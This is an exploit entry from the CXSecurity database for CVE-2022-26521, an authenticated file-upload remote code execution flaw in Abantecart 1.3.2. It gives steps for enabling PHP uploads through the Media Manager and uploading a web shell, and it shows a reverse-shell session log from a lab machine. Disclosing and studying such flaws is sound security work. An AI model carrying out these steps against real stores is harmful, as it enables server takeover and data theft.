---
title: Remote Code Execution in Abantecart-1.3.2
url: https://cxsecurity.com/issue/WLB-2022110016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-14
fetch_date: 2025-10-03T22:40:01.178373
---

# Remote Code Execution in Abantecart-1.3.2

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Remote Code Execution in Abantecart-1.3.2** **2022.11.13**  **![in](https://cert.cx/cxstatic/images/flags/in.png) [Sarang Tumne](https://cxsecurity.com/author/Sarang%2BTumne/1/) **(IN)** ![in](https://cert.cx/cxstatic/images/flags/in.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-26521](https://cxsecurity.com/cveshow/CVE-2022-26521/ "Click to see CVE-2022-26521")**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "CWE-434")**  **[**Dork:** Abantecart exploit](https://cxsecurity.com/dorks/)**  CVSS Base Score: **6.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

# Exploit Title: Authenticated Remote Code Execution in Abantecart-1.3.2
# Remote Code Execution in Abantecart-1.3.2 and earlier allows remote attackers to execute arbitrary code via uploading a php web shell. Abantecart-1.3.2 and earlier allows remote authenticated administrators to execute arbitrary code by uploading an executable file, because the Uploadable File Types setting can be changed by an administrator.
# Exploit Author: Sarang Tumne @CyberInsane (Twitter: @thecyberinsane) #HTB profile: https://www.hackthebox.com/home/users/profile/2718
# Date: 3rd Mar'2022
# CVE ID: CVE-2022-26521
# Confirmed on release 1.3.2
# Vendor: https://www.abantecart.com/download
###############################################
#Step1- Login with Admin Credentials
#Step2- Uploading .php files is disabled by default hence we need to abuse the functionality:
Goto Catalog=>Media Manager=>Images=>Edit=> Add php in Allowed file extensions
#Step3- Now Goto Add Media=>Add Resource=> Upload php web shell
#Step4- Copy the Resource URL location and execute it in the browser e.g. :
Visit //IP\_ADDR/resources/image/18/7a/4.php (Remove the //) and get the reverse shell:
listening on [any] 4477 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.130] 34532
Linux debian 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86\_64 GNU/Linux
11:17:51 up 2:15, 1 user, load average: 1.91, 1.93, 1.52
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
bitnami tty1 - 09:05 1:05m 0.20s 0.01s -bash
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$

**##### References:**

https://github.com/sartlabs/0days/blob/main/Abantecart/Exploit.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110016)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top